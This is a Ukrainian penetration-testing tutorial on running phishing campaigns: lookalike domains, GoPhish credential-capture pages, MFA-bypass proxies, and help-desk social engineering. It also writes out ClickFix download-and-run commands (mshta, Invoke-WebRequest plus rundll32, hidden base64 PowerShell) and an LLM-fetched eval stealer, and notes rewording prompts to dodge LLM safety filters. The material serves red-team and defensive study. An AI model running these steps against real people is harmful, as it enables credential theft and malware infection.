# Методологія фішингу

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Проведіть розвідку жертви
1. Виберіть **домен жертви**.
2. Виконайте базове веб-сканування, **шукаючи портали входу**, які використовує жертва, і **вирішіть**, який із них ви будете **імітувати**.
3. Використайте **OSINT**, щоб **знайти електронні адреси**.
2. Підготуйте середовище
1. **Придбайте домен**, який ви будете використовувати для фішингової оцінки
2. **Налаштуйте пов’язані із сервісом електронної пошти записи** (SPF, DMARC, DKIM, rDNS)
3. Налаштуйте VPS із **gophish**
3. Підготуйте кампанію
1. Підготуйте **шаблон електронного листа**
2. Підготуйте **вебсторінку** для викрадення облікових даних
4. Запустіть кампанію!

## Генерація схожих доменних імен або придбання довіреного домену

### Техніки варіацій доменних імен

- **Keyword**: Доменне ім’я **містить** важливе **ключове слово** оригінального домену (наприклад, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Замініть **крапку на дефіс** у субдомені (наприклад, www-zelster.com).
- **New TLD**: Той самий домен із використанням **нового TLD** (наприклад, zelster.org)
- **Homoglyph**: **Замінює** літеру в доменному імені на **літери, що мають схожий вигляд** (наприклад, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Міняє місцями дві літери** в доменному імені (наприклад, zelsetr.com).
- **Singularization/Pluralization**: Додає або видаляє «s» у кінці доменного імені (наприклад, zeltsers.com).
- **Omission**: **Видаляє одну** з літер доменного імені (наприклад, zelser.com).
- **Repetition:** **Повторює одну** з літер доменного імені (наприклад, zeltsser.com).
- **Replacement**: Подібно до homoglyph, але менш непомітно. Замінює одну з літер доменного імені, можливо, на літеру, розташовану поруч з оригінальною на клавіатурі (наприклад, zektser.com).
- **Subdomained**: Додає **крапку** всередині доменного імені (наприклад, ze.lster.com).
- **Insertion**: **Вставляє літеру** в доменне ім’я (наприклад, zerltser.com).
- **Missing dot**: Додає TLD до доменного імені (наприклад, zelstercom.com)

**Автоматичні інструменти**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Вебсайти**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує **ймовірність, що деякі біти, збережені або передані під час комунікації, можуть автоматично змінитися** через різні фактори, як-от сонячні спалахи, космічні промені або апаратні помилки.

Коли цю концепцію **застосовують до DNS-запитів**, домен, **отриманий DNS-сервером**, може відрізнятися від домену, який спочатку запитували.

Наприклад, зміна одного біта в домені «windows.com» може перетворити його на «windnws.com».

Зловмисники можуть **скористатися цим, зареєструвавши кілька доменів із bit-flipping**, схожих на домен жертви. Їхня мета — перенаправити легітимних користувачів на власну інфраструктуру.

Докладніше див. [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup>

### Придбання довіреного домену

Ви можете пошукати на [https://www.expireddomains.net/](https://www.expireddomains.net) прострочений домен, який можна використовувати.\
Щоб переконатися, що прострочений домен, який ви збираєтеся придбати, **вже має хороші показники SEO**, можна перевірити, як він класифікується в:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Виявлення електронних адрес

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% безкоштовно)
- [https://phonebook.cz/](https://phonebook.cz) (100% безкоштовно)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **виявити більше** дійсних електронних адрес або **перевірити наявні**, можна перевірити, чи вдасться виконати їх brute-force на smtp-серверах жертви. [Дізнайтеся, як перевіряти/виявляти електронні адреси тут](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забувайте: якщо користувачі використовують **будь-який вебпортал для доступу до пошти**, можна перевірити, чи є він вразливим до **username brute force**, і за можливості скористатися вразливістю.

## Налаштування GoPhish

### Встановлення

Завантажити його можна з [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Завантажте та розархівуйте його в `/opt/gophish`, а потім виконайте `/opt/gophish/gophish`\
У виведенні ви отримаєте пароль для адміністратора на порту 3333. Відтак перейдіть на цей порт і використайте ці облікові дані, щоб змінити пароль адміністратора. Можливо, знадобиться тунелювати цей порт на локальний:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Конфігурація

**Конфігурація TLS-сертифіката**

Перед цим кроком ви вже повинні **придбати домен**, який будете використовувати, і він має **вказувати** на **IP-адресу VPS**, де ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Конфігурація пошти**

Почніть інсталяцію: `apt-get install postfix`

Потім додайте домен до таких файлів:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

Також змініть значення таких змінних у файлі /etc/postfix/main.cf

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Зрештою, змініть файли **`/etc/hostname`** і **`/etc/mailname`**, вказавши ім’я вашого домену, і **перезапустіть VPS.**

Тепер створіть **DNS A-запис** для `mail.<domain>`, що вказує на **IP-адресу** VPS, і **DNS MX-запис**, що вказує на `mail.<domain>`

Тепер перевіримо надсилання електронного листа:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Конфігурація Gophish**

Зупиніть виконання Gophish і налаштуймо його.\
Змініть `/opt/gophish/config.json` на наведене нижче (зверніть увагу на використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштування сервісу gophish**

Щоб створити сервіс gophish, який можна буде автоматично запускати та керувати ним як сервісом, створіть файл `/etc/init.d/gophish` із таким вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування сервісу та перевірте його, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування поштового сервера та домену

### Зачекайте й будьте легітимними

Чим старший домен, тим менша ймовірність, що його буде позначено як spam. Тому перед phishing assessment слід зачекати якомога довше (щонайменше 1 тиждень). Крім того, якщо розмістити на сторінці інформацію про репутаційний сектор, отримана репутація буде кращою.

Зверніть увагу, що навіть якщо потрібно зачекати тиждень, ви можете завершити налаштування всього вже зараз.

### Налаштування запису Reverse DNS (rDNS)

Встановіть запис rDNS (PTR), який зіставляє IP-адресу VPS із доменним ім’ям.

### Запис Sender Policy Framework (SPF)

Ви повинні **налаштувати запис SPF для нового домену**. Якщо ви не знаєте, що таке запис SPF, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Ви можете скористатися [https://www.spfwizard.net/](https://www.spfwizard.net) для генерації вашої політики SPF (використайте IP-адресу VPS-машини)

![Форма SPF Wizard для генерації запису SPF для домену phishing](<../../images/image (1037).png>)

Це вміст, який потрібно встановити в записі TXT у домені:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Запис Domain-based Message Authentication, Reporting & Conformance (DMARC)

Ви повинні **налаштувати запис DMARC для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий DNS TXT-запис, що вказує на ім'я хоста `_dmarc.<domain>`, із таким вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Цей посібник базується на: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> Вам потрібно об'єднати обидва значення B64, які генерує ключ DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Перевірте оцінку конфігурації електронної пошти

Ви можете зробити це за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та надішліть електронний лист на адресу, яку вам нададуть:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ви також можете **перевірити конфігурацію електронної пошти**, надіславши листа на `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього вам потрібно буде **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо ви надсилаєте листа від імені root).\
Переконайтеся, що ви пройшли всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **повідомлення до Gmail під вашим контролем** і перевірити **заголовки електронного листа** у своїй скриньці Gmail, у полі заголовка `Authentication-Results` має бути присутнє `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Видалення зі Spamhouse Blacklist

Сторінка [www.mail-tester.com](https://www.mail-tester.com) може повідомити, чи заблоковано ваш домен Spamhouse. Ви можете подати запит на видалення свого домену/IP-адреси за адресою: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення з Microsoft Blacklist

​​Ви можете подати запит на видалення свого домену/IP-адреси за адресою [https://sender.office.com/](https://sender.office.com).

## Створення та запуск кампанії GoPhish

### Профіль надсилання

- Укажіть **назву для ідентифікації** профілю відправника
- Вирішіть, з якого облікового запису ви надсилатимете фішингові листи. Рекомендації: _noreply, support, servicedesk, salesforce..._
- Ви можете залишити поля імені користувача та пароля порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors

![Створення та запуск кампанії GoPhish - Профіль надсилання: Ви можете залишити поля імені користувача та пароля порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується використовувати функцію "**Send Test Email**", щоб перевірити правильність роботи всього.\
> Я рекомендую **надсилати тестові листи на адреси 10min mail**, щоб уникнути потрапляння до blacklist під час тестування.

### Шаблон електронного листа

- Укажіть **назву для ідентифікації** шаблону
- Потім напишіть **тему** (нічого дивного, просто щось, що ви очікували б побачити у звичайному електронному листі)
- Переконайтеся, що встановлено прапорець "**Add Tracking Image**"
- Напишіть **шаблон електронного листа** (ви можете використовувати змінні, як у наведеному нижче прикладі):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Зверніть увагу, що **для підвищення достовірності email** рекомендується використати підпис із якогось email від клієнта. Варіанти:

- Надішліть email на **неіснуючу адресу** та перевірте, чи містить відповідь підпис.
- Знайдіть **публічні email-адреси**, наприклад info@ex.com, press@ex.com або public@ex.com, надішліть їм email і дочекайтеся відповіді.
- Спробуйте зв’язатися з **якоюсь дійсною знайденою** email-адресою та дочекайтеся відповіді.

![Sending Profile - Email Template: Спробуйте зв’язатися з якоюсь дійсною знайденою email-адресою та дочекайтеся відповіді](<../../images/image (80).png>)

> [!TIP]
> Email Template також дозволяє **прикріплювати файли для надсилання**. Якщо ви також хочете викрадати NTLM challenges за допомогою спеціально створених файлів/документів, [прочитайте цю сторінку](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Вкажіть **ім’я**
- **Введіть HTML-код** вебсторінки. Зверніть увагу, що ви можете **імпортувати** вебсторінки.
- Увімкніть **Capture Submitted Data** і **Capture Passwords**
- Встановіть **перенаправлення**

![Email Template - Landing Page: Увімкніть Capture Submitted Data і Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Зазвичай потрібно змінити HTML-код сторінки та виконати кілька локальних тестів (можливо, використовуючи Apache server), **доки результат вас не задовольнить.** Потім вставте цей HTML-код у поле.\
> Якщо вам потрібно **використовувати статичні ресурси** для HTML (наприклад, деякі CSS- і JS-сторінки), їх можна зберегти в _**/opt/gophish/static/endpoint**_, а потім звертатися до них через _**/static/\<filename>**_

> [!TIP]
> Для перенаправлення можна **перенаправити користувачів на легітимну головну вебсторінку** жертви або, наприклад, перенаправити їх на _/static/migration.html_, розмістити там **індикатор завантаження (**[**https://loading.io/**](https://loading.io)**) на 5 секунд, а потім повідомити, що процес успішно завершено**.

### Users & Groups

- Вкажіть ім’я
- **Імпортуйте дані** (зверніть увагу, що для використання template у цьому прикладі потрібні ім’я, прізвище та email-адреса кожного користувача)

![Landing Page - Users & Groups: Імпортуйте дані (зверніть увагу, що для використання template у цьому прикладі потрібні ім’я, прізвище та email-адреса кожного користувача)](<../../images/image (163).png>)

### Campaign

Нарешті, створіть campaign, вибравши ім’я, email template, landing page, URL, sending profile та group. Зверніть увагу, що URL буде посиланням, надісланим жертвам.

Зверніть увагу, що **Sending Profile дозволяє надіслати тестовий email, щоб перевірити, як виглядатиме фінальний phishing email**:

![Users & Groups - Campaign: Зверніть увагу, що Sending Profile дозволяє надіслати тестовий email, щоб перевірити, як виглядатиме фінальний phishing email](<../../images/image (192).png>)

> [!TIP]
> Я рекомендував би **надсилати тестові email на 10min mail-адреси**, щоб уникнути потрапляння в blacklist під час тестування.

Коли все готово, просто запустіть campaign!

## Клонування вебсайту

Якщо з будь-якої причини ви хочете клонувати вебсайт, перегляньте цю сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

У деяких phishing assessments (переважно для Red Teams) ви також можете захотіти **надсилати файли, що містять backdoor** (можливо, C2 або просто щось, що ініціює authentication).\
Перегляньте цю сторінку, щоб ознайомитися з прикладами:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Через Proxy MitM

Попередня атака є досить хитрою, оскільки ви підробляєте справжній вебсайт і збираєте інформацію, яку вводить користувач. На жаль, якщо користувач не ввів правильний пароль або якщо підроблений вами application налаштований із 2FA, **ця інформація не дозволить вам impersonate обманутого користувача**.

Саме тут корисні такі tools, як [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) і [**muraena**](https://github.com/muraenateam/muraena). Цей tool дозволяє виконувати MitM-подібну атаку. Загалом атака працює так:

1. Ви **імпersonate login** form справжньої вебсторінки.
2. Користувач **надсилає** свої **credentials** на вашу fake page, а tool надсилає їх на справжню вебсторінку, **перевіряючи, чи працюють credentials**.
3. Якщо account налаштований із **2FA**, MitM page запитає його, і після того, як **користувач введе** його, tool надішле його на справжню вебсторінку.
4. Після authentication користувача ви (як attacker) матимете **captured credentials, 2FA, cookie та будь-яку інформацію** про кожну взаємодію під час виконання tool MitM.

### Через VNC

Що, якби замість **перенаправлення жертви на malicious page**, яка виглядає так само, як оригінальна, ви перенаправили її до **VNC session із browser, підключеним до справжньої вебсторінки**? Ви зможете бачити, що вона робить, викрасти пароль, використану MFA, cookies...\
Це можна зробити за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup>

## Виявлення виявлення

Очевидно, один із найкращих способів дізнатися, чи вас викрили, — **перевірити свій domain у blacklists**. Якщо він там є, це означає, що ваш domain якимось чином було виявлено як suspicious.\
Один із простих способів перевірити, чи є ваш domain у blacklist, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак існують й інші способи дізнатися, чи жертва **активно шукає suspicious phishing activity у мережі**, як пояснюється тут:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **придбати domain із дуже схожим ім’ям** на domain жертви **та/або створити certificate** для **subdomain** домену, який контролюєте, **що містить** **keyword** domain жертви. Якщо **жертва** виконає з ними будь-яку **DNS або HTTP interaction**, ви дізнаєтеся, що **вона активно шукає** suspicious domains, і вам потрібно буде діяти дуже stealth.<sup>[[2]](#references)</sup>

### Оцінювання phishing

Використовуйте [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи потрапить ваш email у spam folder, чи його буде заблоковано або доставлено успішно.

## Компрометація ідентичності з активною взаємодією (скидання MFA через Help-Desk)

Сучасні intrusion sets дедалі частіше повністю оминають email lures і **безпосередньо атакують workflow service-desk / identity-recovery**, щоб обійти MFA. Атака повністю працює за принципом "living-off-the-land": після отримання оператором valid credentials він переміщується за допомогою вбудованих admin tools — malware не потрібен.<sup>[[5]](#references)</sup>

### Attack flow
1. Проведіть recon жертви
* Збирайте особисті та корпоративні відомості з LinkedIn, data breaches, public GitHub тощо.
* Визначте identities високої цінності (керівники, IT, finance) та з’ясуйте **точний help-desk process** для password / MFA reset.
2. Соціальна інженерія в реальному часі
* Зателефонуйте, напишіть у Teams або chat до help-desk, impersonating target (часто зі **spoofed caller-ID** або **cloned voice**).
* Надайте попередньо зібрані PII, щоб пройти knowledge-based verification.
* Переконайте агента **скинути MFA secret** або виконати **SIM-swap** зареєстрованого mobile number.
3. Негайні post-access actions (≤60 хв у реальних випадках)
* Створіть foothold через будь-який web SSO portal.
* Перерахуйте AD / AzureAD за допомогою вбудованих tools (binaries не скидаються):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Виконуйте lateral movement за допомогою **WMI**, **PsExec** або легітимних **RMM** agents, які вже додані до whitelist в environment.

### Detection & Mitigation
* Розглядайте identity recovery через help-desk як **privileged operation** — вимагайте step-up auth та approval менеджера.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які генерують alert у разі:
* Зміни MFA method + authentication із нового device / geo.
* Негайного elevation того самого principal (user-→-admin).
* Записуйте help-desk calls і вимагайте **call-back на вже зареєстрований номер** перед будь-яким reset.
* Реалізуйте **Just-In-Time (JIT) / Privileged Access**, щоб щойно reset accounts **не успадковували автоматично tokens із високими привілеями**.

---

## Deception у масштабі — SEO Poisoning і кампанії “ClickFix”
Commodity crews компенсують витрати на high-touch ops за допомогою mass attacks, які перетворюють **search engines і ad networks на канал доставки**.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** просуває fake result, наприклад `chromium-update[.]site`, на верхні позиції search ads.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, які спостерігала Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, а потім завантажує **silent loader**, який *у realtime* вирішує, що розгортати:
* RAT (наприклад, AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Поради щодо hardening

* Блокуйте newly-registered domains та застосовуйте **Advanced DNS / URL Filtering** також до *search ads*, а не лише до e-mail.
* Обмежте software installation підписаними MSI / Store packages, забороніть виконання `HTA`, `ISO`, `VBS` за допомогою policy.
* Відстежуйте child processes browser, які відкривають installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Шукайте LOLBins, якими часто зловживають first-stage loaders (наприклад, `regsvr32`, `curl`, `mshta`).

### Hijacking кліку по кнопці завантаження з передачею до TDS

Деякі fake software portals залишають видимий download `href`, що вказує на **справжню GitHub/release URL**, але перехоплюють **першу** user interaction у JavaScript і натомість спрямовують жертву до ланцюжка **Traffic Distribution System (TDS)**.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ключові ознаки:
- Хук зазвичай працює у **capture phase** (`true`) на `document`, тому спрацьовує до обробників сайту.
- Chrome часто використовує `mousedown` замість `click`, щоб прив'язати redirect до дійсного **user gesture** і підвищити ефективність обходу блокувальників popup.
- Деякі варіанти заздалегідь відкривають `about:blank` або імітують кліки `<a target="_blank">`, а URL TDS призначають лише пізніше.
- Обмеження на стороні browser часто зберігаються в `localStorage`, тому **перший клік** може перенаправити до malware, а після оновлення сторінки або повторних спроб відбувається повернення до benign-looking видимого посилання.
- TDS може фільтрувати за referrer, entry domain, GEO, browser/device fingerprint, перевірками VPN/datacenter, контекстом кліку та лічильниками для кожної сесії, через що повторне відтворення аналітиком може бути недетермінованим.

Ідеї для захисту:
- Порівнюйте **відображений** `href` із **фактичною** ціллю навігації, що генерується під час кліку.
- Виявляйте обробники `document.addEventListener(..., true)`, які викликають і `preventDefault()`, і `stopImmediatePropagation()` у зв'язці з `window.open`, `about:blank` або імітованими кліками anchor.
- Розглядайте кластери нещодавно зареєстрованих доменів для завантаження software, які завантажують один і той самий CloudFront/JS stage, як високосигнальний патерн SEO-poisoning/TDS.

### ClickFix із fake verification pages + archive-looking LOLBAS fetches
Деякі гілки TDS завершуються fake verification page (у стилі Cloudflare/IUAM), яка вказує жертві запустити довірений Windows binary, наприклад:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Нотатки:
- `mshta.exe` виконує **HTA/VBScript на початку відповіді**, навіть якщо URL видає себе за архів `.7z`; додані дані архіву можуть бути звичайною приманкою.
- Наступні етапи часто й надалі неправдиво вказують тип файлу (`.rtf` для PowerShell, `.asar` для Python, ZIP-архіви з доповненими бінарними файлами), а потім переходять до **ручного PE-мапінгу / виконання в памʼяті**.
- Якщо ви реагуєте на один із таких ланцюжків, зберігайте **мережеві дані та дані памʼяті від першого успішного запуску**: пізніші повторні запуски можуть показувати лише нешкідливий шлях інсталятора/SFX або завершуватися невдало, оскільки вивільнення payload/key було привʼязане до початкової TDS-сесії.

### Тактика доставки DLL через ClickFix (фальшиве оновлення CERT)
* Приманка: клонована рекомендація національного CERT із кнопкою **Update**, яка відображає покрокові інструкції щодо «виправлення». Жертвам пропонують запустити batch-файл, який завантажує DLL і виконує її через `rundll32`.<sup>[[8]](#references)</sup>
* Типовий batch-ланцюжок:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` записує payload у `%TEMP%`, коротка затримка приховує мережеві затримки, після чого `rundll32` викликає експортовану точку входу (`notepad`).
* DLL надсилає beacon із даними про ідентифікацію хоста та опитує C2 кожні кілька хвилин. Віддалені tasking-команди надходять як **закодований у base64 PowerShell**, який виконується приховано та з обходом політик:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Це зберігає гнучкість C2 (сервер може змінювати tasking-команди без оновлення DLL) і приховує вікна консолі. Шукайте дочірні процеси PowerShell у `rundll32.exe`, які одночасно використовують `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Захисники можуть шукати HTTP(S)-callback-запити у форматі `...page.php?tynor=<COMPUTER>sss<USER>` та інтервали опитування 5 хвилин після завантаження DLL.

---

## Phishing Operations із використанням AI
Зловмисники тепер поєднують **LLM та voice-clone API** для повністю персоналізованих приманок і взаємодії в реальному часі.

| Рівень | Приклад використання threat actor |
|-------|-------------|
|Автоматизація|Генерація та надсилання понад 100 тис. email / SMS із рандомізованими формулюваннями та tracking-посиланнями.|
|Generative AI|Створення *одноразових* email-повідомлень із посиланнями на публічні M&A, внутрішні жарти із соціальних мереж; deep-fake голос CEO у callback scam.|
|Agentic AI|Автономна реєстрація доменів, збір open-source intel, створення наступних email-повідомлень, коли жертва натискає посилання, але не надсилає облікові дані.|

**Захист:**
• Додавайте **динамічні банери**, які виділяють повідомлення, надіслані через ненадійну автоматизацію (за аномаліями ARC/DKIM).
• Впроваджуйте **голосові біометричні challenge-фрази** для телефонних запитів із високим ризиком.
• Постійно моделюйте приманки, згенеровані AI, у програмах підвищення обізнаності — статичні шаблони застаріли.

Див. також — зловживання agentic browsing для credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Див. також — зловживання AI agent локальними CLI-інструментами та MCP (для інвентаризації secrets і виявлення):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (генерація коду в браузері)

Зловмисники можуть доставляти HTML, що виглядає нешкідливо, і **генерувати stealer під час виконання**, запитуючи JavaScript у **довіреного LLM API**, а потім виконуючи його в браузері (наприклад, через `eval` або динамічний `<script>`).<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** кодування URL для exfil/Base64-рядків у prompt; ітеративна зміна формулювань для обходу safety-фільтрів і зменшення кількості hallucination.
2. **Client-side API call:** під час завантаження JS викликає публічний LLM (Gemini/DeepSeek тощо) або CDN proxy; у статичному HTML присутні лише prompt/API-виклик.
3. **Assemble & exec:** обʼєднання відповіді та її виконання (поліморфно під час кожного відвідування):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** згенерований код персоналізує приманку (наприклад, парсинг токена LogoKit) і надсилає creds на endpoint, прихований у prompt.

**Ознаки ухилення**
- Трафік надходить до відомих доменів LLM або авторитетних CDN-проксі; іноді через WebSockets до backend.
- Статичне навантаження відсутнє; шкідливий JS існує лише після render.
- Недетерміновані генерації створюють **унікальні stealers для кожної сесії**.

**Ідеї для виявлення**
- Запускайте sandbox із увімкненим JS; позначайте **runtime `eval`/динамічне створення скриптів, джерелом яких є відповіді LLM**.
- Шукайте front-end POST-запити до LLM API, одразу після яких у тексті, що повернувся, викликаються `eval`/`Function`.
- Створюйте alert для несанкціонованих доменів LLM у client traffic із подальшими POST-запитами облікових даних.

---

## Варіант MFA Fatigue / Push Bombing – Примусовий Reset
